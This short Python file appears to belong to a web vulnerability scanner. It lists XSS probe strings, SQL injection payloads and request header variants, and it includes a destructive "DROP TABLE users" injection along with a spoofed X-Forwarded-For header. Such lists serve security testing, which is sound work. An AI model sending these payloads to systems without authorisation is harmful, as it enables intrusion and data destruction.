# modules/scanner/payloads.py
XSS_PAYLOADS = [
    "<script>penai_xss</script>",
    "\"><script>penai_xss</script>",
    "'\"><img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<iframe srcdoc=\"<script>penai_xss</script>\"></iframe>",
    "\"><svg><script>penai_xss</script></svg>"
]

SQLI_PAYLOADS = [
    "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR '1'='1' -- ",
    "'; DROP TABLE users; --", "1' OR '1'='1' /*", "UNION SELECT NULL,NULL--"
]

HEADER_VARIANTS = [
    {"User-Agent": "PenAI-Min/1.0"},
    {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"},
    {"User-Agent": "PenAI-Min/1.0", "X-Forwarded-For": "127.0.0.1"},
]
